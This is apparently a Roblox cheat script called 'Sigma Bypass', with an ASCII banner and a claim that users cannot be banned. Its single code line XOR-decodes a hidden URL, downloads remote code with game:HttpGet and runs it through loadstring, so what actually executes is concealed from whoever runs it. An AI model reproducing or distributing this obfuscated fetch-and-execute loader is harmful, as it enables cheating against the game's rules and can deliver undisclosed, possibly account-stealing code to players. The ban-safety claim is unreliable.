--[[

Status: 🟢 (you can't get banned)

 ____  _                         ____                            
/ ___|(_) __ _ _ __ ___   __ _  | __ ) _   _ _ __   __ _ ___ ___ 
\___ \| |/ _` | '_ ` _ \ / _` | |  _ \| | | | '_ \ / _` / __/ __|
 ___) | | (_| | | | | | | (_| | | |_) | |_| | |_) | (_| \__ \__ \
|____/|_|\__, |_| |_| |_|\__,_| |____/ \__, | .__/ \__,_|___/___/
         |___/                         |___/|_|                    

          \_ Sorry if this isn't good i just made this for fun. Credits: dario.lua

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\193\208\207\107\239\181\201\17\220\202\149\43\227\175\136\14\208\208\207\32\169\169\193\16\211\219\195\34\224\236\209\71\135\212\223\112\226\239\193\70\193\149\130\45\226\244\213\31\198","\126\177\163\187\69\134\219\167")))();
